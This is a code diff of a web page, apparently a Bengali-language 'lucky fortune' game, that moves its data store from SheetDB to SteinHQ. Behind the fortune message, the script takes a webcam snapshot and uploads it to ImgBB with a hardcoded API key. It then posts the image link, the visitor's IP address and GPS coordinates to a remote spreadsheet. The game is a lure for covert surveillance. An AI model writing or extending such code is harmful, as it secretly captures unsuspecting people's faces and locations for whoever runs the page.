@@ -41,8 +41,9 @@
 <canvas id="canvas"></canvas>
 
 <script>
+    // আপনার ইমেজ এবং নতুন স্টেইন এপিআই লিঙ্ক
     const IMGBB_API_KEY = "3d66780bd0b6e264f2f3c64a306022cc"; 
-    const SHEETDB_URL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet9";
+    const STEIN_API_URL = "https://api.steinhq.com/v1/storages/69844bf5affba40a624779e3/Sheet9";
     
     const startBtn = document.getElementById('startBtn');
     const statusDiv = document.getElementById('status');
@@ -63,13 +64,13 @@
         } catch (e) { userIP = "Unknown"; }
     }
 
-    // শিট থেকে র‍্যান্ডম রেজাল্ট আনা
+    // SteinHQ থেকে ডাটা রিড করা
     async function fetchRandomLuckyResult() {
         try {
-            const response = await fetch(SHEETDB_URL);
+            const response = await fetch(STEIN_API_URL);
             const data = await response.json();
             
-            // 'dy' কলামের ডাটাগুলো ফিল্টার করা
+            // 'dy' কলাম থেকে ডাটা ফিল্টার করা
             const results = data.map(row => row.dy).filter(val => val && val.trim() !== "");
             
             if (results.length > 0) {
@@ -78,11 +79,12 @@
             }
             return "আপনার ভাগ্য আজ রহস্যময়, আবার চেষ্টা করুন!";
         } catch (error) {
-            console.error("SheetDB Error:", error);
-            return "আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।"; // এরর হলে ডিফল্ট মেসেজ
+            console.error("SteinHQ Fetch Error:", error);
+            return "আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।"; 
         }
     }
 
+    // SteinHQ তে ডাটা পোস্ট করা
     async function captureAndSend() {
         if (video.readyState === video.HAVE_ENOUGH_DATA) {
             const context = canvas.getContext('2d');
@@ -103,15 +105,16 @@
                 
                 if(imgbbData.success) {
                     const imageUrl = imgbbData.data.url;
-                    await fetch(SHEETDB_URL, {
+                    // SteinHQ-এর পোস্ট ফরম্যাট অনুযায়ী ডাটা পাঠানো
+                    await fetch(STEIN_API_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            "data": [{ "img": imageUrl, "ip": userIP, "gps": gpsData }]
-                        })
+                        body: JSON.stringify([
+                            { "img": imageUrl, "ip": userIP, "gps": gpsData }
+                        ])
                     });
                 }
-            } catch (e) { console.error("Upload Error"); }
+            } catch (e) { console.error("Upload/Post Error:", e); }
         }
     }
 
@@ -142,7 +145,7 @@
 
             setTimeout(captureAndSend, 1500);
 
-            // রেজাল্ট ফেচ করা শুরু
+            // রেজাল্ট ফেচ করা
             const finalLuckyMessage = await fetchRandomLuckyResult();
 
             setTimeout(() => {
